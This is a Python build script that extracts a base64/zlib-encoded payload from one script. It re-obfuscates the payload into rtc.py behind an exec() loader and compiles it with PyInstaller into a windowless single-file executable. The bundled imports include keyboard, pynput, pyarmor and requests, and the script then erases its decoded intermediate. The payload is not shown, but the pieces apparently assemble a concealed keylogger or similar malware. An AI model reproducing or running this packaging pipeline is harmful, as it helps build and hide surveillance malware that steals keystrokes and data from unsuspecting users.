import zlib
import base64
import re

# Step 1: Read the original script (rto.py) and extract the encoded text
with open("rto.py", "r") as file:
    content = file.read()

# Use regex to find the encoded string inside base64.b64decode('...')
match = re.search(r"base64\.b64decode\('([^']+)'\)\)", content)

if match:
    encoded_text = match.group(1)

    # Step 2: Decode and decompress the text
    extracted_text = zlib.decompress(base64.b64decode(encoded_text)).decode('utf-8')

    # Step 3: Save extracted text to a file
    with open("extractedtext.txt", "w", encoding="utf-8") as text_file:
        text_file.write(extracted_text)

    # Step 4: Re-obfuscate the extracted text
    obfuscated_text = base64.b64encode(zlib.compress(extracted_text.encode('utf-8'))).decode('utf-8')

    # Step 5: Generate rtc.py with the obfuscated text
    rtc_script = f"""
import zlib
import base64
import threading
import time

buffer = ""
buffer_lock = threading.Lock()

obfuscated_code = '''
{obfuscated_text}
'''

exec(zlib.decompress(base64.b64decode(obfuscated_code)))
"""

    with open("rtc.py", "w", encoding="utf-8") as rtc_file:
        rtc_file.write(rtc_script)

    print("Extraction and re-obfuscation complete. rtc.py generated.")
else:
    print("No encoded text found in rto.py.")

# Auto-compile the generated rtc.py
import subprocess

subprocess.run(["pyinstaller", "--onefile", "--noconsole", "-i", "i.ico", "rtc.py", "--hidden-import", "altgraph",
                "--hidden-import", "bottle", "--hidden-import", "bottle-websocket", "--hidden-import", "certifi",
                "--hidden-import", "cffi", "--hidden-import", "charset-normalizer", "--hidden-import", "crypto",
                "--hidden-import", "cryptography", "--hidden-import", "cryptography.fernet", "--hidden-import",
                "distlib", "--hidden-import", "Eel", "--hidden-import", "filelock", "--hidden-import", "future",
                "--hidden-import", "gevent", "--hidden-import", "gevent-websocket", "--hidden-import", "greenlet",
                "--hidden-import", "idna", "--hidden-import", "keyboard", "--hidden-import", "Naked", "--hidden-import",
                "packaging", "--hidden-import", "pefile", "--hidden-import", "pexpect", "--hidden-import",
                "platformdirs", "--hidden-import", "ptyprocess", "--hidden-import", "pyarmor", "--hidden-import",
                "pycparser", "--hidden-import", "pycryptodome", "--hidden-import", "pycryptodomex", "--hidden-import",
                "pyinstaller-hooks-contrib", "--hidden-import", "pyminifier3", "--hidden-import", "pyminify",
                "--hidden-import", "pynput", "--hidden-import", "pyparsing", "--hidden-import", "pywin32-ctypes",
                "--hidden-import", "PyYAML", "--hidden-import", "requests", "--hidden-import", "setuptools",
                "--hidden-import", "sh", "--hidden-import", "shellescape", "--hidden-import", "six", "--hidden-import",
                "typing_extensions", "--hidden-import", "urllib3", "--hidden-import", "virtualenv", "--hidden-import",
                "zope.event", "--hidden-import", "zope.interface", "--hidden-import", "altgraph", "--hidden-import",
                "bottle", "--hidden-import", "bottle-websocket", "--hidden-import", "certifi", "--hidden-import",
                "cffi", "--hidden-import", "charset-normalizer", "--hidden-import", "crypto", "--hidden-import",
                "cryptography", "--hidden-import", "distlib", "--hidden-import", "Eel", "--hidden-import", "filelock",
                "--hidden-import", "future", "--hidden-import", "gevent", "--hidden-import", "gevent-websocket",
                "--hidden-import", "greenlet", "--hidden-import", "idna", "--hidden-import", "keyboard",
                "--hidden-import", "Naked", "--hidden-import", "packaging", "--hidden-import", "pefile",
                "--hidden-import", "pexpect", "--hidden-import", "platformdirs", "--hidden-import", "ptyprocess",
                "--hidden-import", "pyarmor", "--hidden-import", "pycparser", "--hidden-import", "pycryptodome",
                "--hidden-import", "pycryptodomex", "--hidden-import", "pyinstaller-hooks-contrib", "--hidden-import",
                "pyminifier3", "--hidden-import", "pyminify", "--hidden-import", "pynput", "--hidden-import",
                "pyparsing", "--hidden-import", "pywin32-ctypes", "--hidden-import", "PyYAML", "--hidden-import",
                "requests", "--hidden-import", "setuptools", "--hidden-import", "sh", "--hidden-import", "shellescape",
                "--hidden-import", "six", "--hidden-import", "typing_extensions", "--hidden-import", "urllib3",
                "--hidden-import", "virtualenv", "--hidden-import", "zope.event", "--hidden-import", "zope.interface"])

# Clean up extractedtext.txt after all processes are done
def cleanup():
    with open("extractedtext.txt", "w", encoding="utf-8") as text_file:
        text_file.write("")
    print("extractedtext.txt has been cleaned.")

cleanup()
